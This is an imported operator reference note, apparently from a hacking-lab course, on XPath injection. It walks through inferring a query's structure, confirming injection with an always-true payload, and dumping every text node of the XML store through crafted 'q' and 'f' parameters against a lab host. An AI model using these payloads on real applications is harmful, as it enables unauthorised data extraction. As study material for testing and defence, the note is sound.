---
technique: "XPath - Data Exfiltration"
family: "injection"
severity_hint: "medium"
tags: []
source: "_raw/Web attacks/Web Attacks/XPath Injections/XPath - Data Exfiltration.md"
source_sha256: "6fe6a984e6be498e1a402d592daee9b5ac13d0104d707768cc2f568f5bc84640"
curator_version: 2
review_status: imported-unreviewed
---

# XPath - Data Exfiltration

> Family: **injection** · Severity hint: **medium** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `xml: <a>`
- `xml: /a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]`
- `python: GET /index.php?q=SOMETHINGINVALID&f=fullstreetname+|+//text() HTTP/1.1`
- `python: /a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | //text()`
- `python: /a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]/../../..//text()`

## Playbook (operator notes)

# XPath - Data Exfiltration

# **Simple Data Exfiltration**

- Example
    - Web application that allows to query data
        
        
        
        
        
    - This reveals two node names: `fullstreetname` and `streetname`
    - From the web application's behavior, we can deduce information about the XPath query that is performed
    - Since we do not know the names of the element nodes in the XML document, we will denote the path by single character placeholder names `a`, `b`, `c`, and `d`. The query most likely looks like this `/a/b/c/[contains(d/text(), 'BAR')]/fullstreetname`
        
        <aside>
        ℹ️ **Note: For now, w**e do not know whether the depth of the XML schema is three like depicted above (`/a/b/c`).
        
        </aside>
        
    - The document has to look something like this
        
        ```xml
        <a>
        	<b>
        		<c>
        			<d>???</d>
        			<streetname>BARCELONA</streetname>
        			<fullstreetname>BARCELONA AVE</fullstreetname>
        		</c>
        	</b>
        </a>
        ```
        

# **Confirming XPath Injection**

- Confirm by sending a payload like this `SOMETHINGINVALID') or ('1'='1` in the `q` parameter
    
    ```xml
    /a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]
    ```
    
    
    

### **Exfiltrating Data**

- Append a new query that returns all text nodes

```python
GET /index.php?q=SOMETHINGINVALID&f=fullstreetname+|+//text() HTTP/1.1
Host: xpath-exfil.htb
```

```python
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | //text()
```

- Same result using the `q` parameter via `SOMETHINGINVALID') or ('1'='1` and setting the `f` parameter to `../../..//text()`

```python
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]/../../..//text()
```

## Source
Original note: `_raw/Web attacks/Web Attacks/XPath Injections/XPath - Data Exfiltration.md`
